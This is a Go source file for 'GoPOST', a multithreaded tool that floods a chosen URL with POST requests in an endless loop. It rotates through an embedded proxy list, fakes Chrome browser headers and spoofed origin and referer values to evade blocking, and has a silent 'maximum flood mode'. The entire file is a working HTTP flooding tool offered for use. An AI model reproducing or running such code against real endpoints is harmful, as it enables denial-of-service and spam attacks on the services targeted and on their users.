package main

import (
	"bytes"
	_ "embed"
	"flag"
	"fmt"
	"gopost/src/helpers"
	"io"
	"net/http"
	url2 "net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

var stop bool = false
var wg sync.WaitGroup

//go:embed res/proxies.txt
var proxies string
var proxiesList []string

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func SendRandomData(url string, payload string, threadnum int, verbose bool, aggressive bool, origin string, referer string, useragent string) {
	defer wg.Done()
	if verbose && !aggressive {
		fmt.Printf("[THREAD #%d] Starting...\n", threadnum)
	}

	for stop == false {
		if verbose && !aggressive {
			fmt.Printf("[THREAD #%d] URL:>%s\n", threadnum, url)
		}

		if verbose && !aggressive {
			fmt.Printf("[THREAD #%d] JSON:>%s\n", threadnum, payload)
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
		req.Header.Set("Content-Type", "application/json")
		if origin != "" {
			req.Header.Set("origin", origin)
		}
		req.Header.Set("sec-ch-ua-platform", "\"Windows\"")
		req.Header.Set("user-agent", useragent)
		req.Header.Set("sec-ch-ua", "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"")
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("accept", "*/*")
		req.Header.Set("sec-fetch-site", "cross-site")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-dest", "empty")
		if referer != "" {
			req.Header.Set("referer", referer)
		}
		req.Header.Set("accept-language", "en-US,en;q=0.9")
		req.Header.Set("priority", "u=1, i")

		var proxy = proxiesList[helpers.RandomRange(0, len(proxiesList)-1)]
		if verbose && !aggressive {
			fmt.Printf("[THREAD #%d] Proxy:>%s\n", threadnum, proxy)
		}
		proxyUrl, err := url2.Parse(proxy)

		client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		if !aggressive {
			if verbose {
				body, _ := io.ReadAll(resp.Body)
				fmt.Printf("[THREAD #%d] Response Status: %s, Response Body: %s\n", threadnum, resp.Status, string(body))
			} else {
				fmt.Printf("[THREAD #%d] Response Status: %s\n", threadnum, resp.Status)
			}
		}

		_ = resp.Body.Close()
		client.CloseIdleConnections()
	}

}
func main() {
	urlPtr := flag.String("url", "", "URL to flood with POST requests. This should be the full URL to your endpoint.")
	payloadPtr := flag.String("payload", "", "Path to a payload JSON file to send via POST flooding.")
	originPtr := flag.String("origin", "", "(Optional) URL to value the origin header with.")
	refererPtr := flag.String("referer", "", "(Optional) URL to value the referer header with.")
	uaPtr := flag.String("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "(Optional) User-Agent to use for POST flooding.")
	threadsPtr := flag.Int("threads", 16, "Number of goroutines to use.")
	verbosePtr := flag.Bool("v", false, "Verbose output.")
	speedModePtr := flag.Bool("a", false, "Do not log anything to console, aka maximum flood mode.")

	flag.Parse()

	if *urlPtr == "" {
		fmt.Println("[ERROR] URL is required.")
		os.Exit(1)
	}

	if *payloadPtr == "" {
		fmt.Println("[ERROR] Payload is required.")
		os.Exit(1)
	}

	absPath, err := filepath.Abs(*payloadPtr)
	check(err)

	readPayload, err := os.ReadFile(absPath)
	check(err)

	fmt.Println("GoPOST v1.0.1 starting...")
	fmt.Printf("URL: %s\n", *urlPtr)
	fmt.Printf("Payload: %s\n", *payloadPtr)
	if *originPtr != "" {
		fmt.Printf("Origin: %s\n", *originPtr)
	}
	if *refererPtr != "" {
		fmt.Printf("Referer: %s\n", *refererPtr)
	}
	fmt.Printf("Threads: %d\n", *threadsPtr)
	fmt.Printf("Verbose: %t\n", *verbosePtr)
	fmt.Printf("Aggressive: %t\n", *speedModePtr)

	proxiesList = strings.Split(proxies, "\n")

	for i := 0; i < *threadsPtr; i++ {
		wg.Add(1)
		go SendRandomData(*urlPtr, string(readPayload), i+1, *verbosePtr, *speedModePtr, *originPtr, *refererPtr, *uaPtr)
	}
	wg.Wait()
}
